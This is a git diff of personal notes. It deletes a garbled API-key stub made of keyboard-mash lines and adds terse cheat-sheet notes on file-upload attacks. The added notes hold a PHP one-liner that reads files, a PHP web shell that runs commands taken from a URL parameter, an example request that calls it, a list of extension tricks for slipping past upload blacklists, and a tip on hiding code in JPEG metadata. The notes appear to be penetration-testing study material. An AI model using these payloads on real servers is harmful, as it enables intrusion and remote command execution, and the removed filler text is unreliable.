@@ -1,68 +1,30 @@
-# API KEYS
+PHP Files one line code 
 
-## SUMMA
+<?php echo file_get_contents('/path/to/target/file'); ?>        //user text/plain and application/x-httpd-php  when upload the php//
+<?php echo system($_GET['command']); ?>
+GET /example/exploit.php?command=id HTTP/1.1     //in place id enter the command//
 
-# API Key L
-- [Tools](#tools)
-  
-dfbgfdb
+conent type header:
+application/x-www-form-url-encoded    //for sending the simple text, HTML//
+multipart/form-data     //for sending large amount of data Image, pdf//
+image/jpeg  
+image/png     //images conetent types//
+application/x-httpd-php   
 
-hvbf'jhbs
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d642e97d8d3a106f3eed799ba77f551aba60b74b/API%20Key%20Leaks/README.md?plain=1#L49C10-L49C10
-kjbsdv
-kjbv
-jb
-sdvbkj
-jkbvss'bk
+blacklistfiles bypass::
+.php
+.php5
+.shtml
+.pHp
+exploit.php.jpg
+exploit.php.
+exploit%2Ephp (url encode for .)
+exploit.asp;.jpg
+exploit.asp%00.jpg
+exploit.p.phphp
 
-kjbvsd
-bkjsd;v
+File Conetents:
+ JPEG files always begin with the bytes FF D8 FF in the burp response body
+ ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.
 
-dvdfv
-
-kjbdsv
-
-dfvdf
-
-kjbdvs
-
-sdfbf
-
-kjsbdv
-sdfb
-sdf
-sfdb
-sddsfbfvb
-sfdb
-sdfb
-sdfvb
-sdfb
-bsd
-sdfbfsb
-sfdb
-sdfb
-dfbsfb
-fgbfb
-sfb
-sfbsfb
-sb
-sfb
-sfsfbb
-b
-sb
-sfb
-sfb
-rwgt
-
-yrujyu
-tyukyuk
-
-tiuy
-
-t7iuyi
-
-tyiuy
-
-srtg
-# Tools
-yuj
+ 
